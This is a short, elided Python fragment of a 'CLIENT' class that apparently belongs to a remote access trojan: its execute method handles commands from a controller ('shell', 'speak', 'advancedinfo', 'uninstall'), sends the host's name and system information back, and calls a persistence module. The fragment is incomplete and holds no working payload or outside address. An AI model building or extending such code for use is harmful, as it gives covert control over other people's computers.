class CLIENT:
    ...
    def execute(self, command):
        ...
        if data[0] == "shell":
            ...
            #print("Executing Screenshot: " + data[1])
            self.send_data(platform.node())
        elif data[0].startswith("speak"):
            raw_data = data[0].replace("speak"," ")
            addon = ADDONS()
            self.send_data(addon.voice(raw_data))
        elif data[0] == "advancedinfo":
            addon = ADDONS()
            self.send_data(addon.info())
        elif data[0] == "uninstall":
            pers = PERSISTENCE()
            pers.uninstall()
            self.send_data("UNINSTALLED")
